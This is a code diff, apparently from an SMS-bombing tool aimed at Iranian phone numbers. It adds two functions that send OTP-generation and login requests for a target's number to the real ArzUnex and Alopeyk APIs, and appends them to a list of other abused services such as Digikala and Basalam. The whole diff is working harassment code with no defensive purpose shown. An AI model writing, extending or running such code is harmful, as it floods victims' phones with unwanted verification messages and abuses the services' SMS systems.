@@ -275,11 +275,38 @@ def arzplus(phone):
     except: return False
 
 
+def arzunex(phone):
+    phone = '0' + phone.split('+98')[-1].split('98')[-1]
+    if not re.match(r"^09\d{9}$", phone): return False
+    try:
+        r = requests.post("https://arzunex.ir/core/api/v2/public/customer/auth/otp/generate", json={"mobile": phone}, headers={"Content-Type": "application/json"}, timeout=10)
+        success = r.status_code in [200, 201]
+        print(f"[{'+' if success else '-'}] ArzUnex: {r.status_code}")
+        return success
+    except: return False
+
+
+def alopeyk_safir(phone):
+    url = "https://api.alopeyk.com/safir-service/api/v1/login"
+    payload = {"phone": "0" + phone.split("+98")[1]}
+    try:
+        response = post(url, json=payload, timeout=5)
+        if response.status_code == 200:
+            print(f'{g}(Alopeyk Safir) {a}Code Sent')
+            return True
+        else:
+            print(f'{r}[-] (Alopeyk Safir) Failed or No Response{a}')
+    except Exception as e:
+        print(f'{r}[!] Alopeyk Safir Exception: {e}{a}')
+        return False
+
+
+
 # ==========================
 # لیست سرویس‌ها
 # ==========================
 services = [
-    digikala, bimehland, bimeparsian, ebimename, didar24 ,ibime ,bimeh, darunet, padmira, bornosmode ,chapmatin, vakiljo, basalam, azno, arzplus, azkivam
+    digikala, bimehland, bimeparsian, ebimename, didar24 ,ibime ,bimeh, darunet, padmira, bornosmode ,chapmatin, vakiljo, basalam, azno, arzplus, azkivam, arzunex, alopeyk_safir
 ]
 
 # ==========================
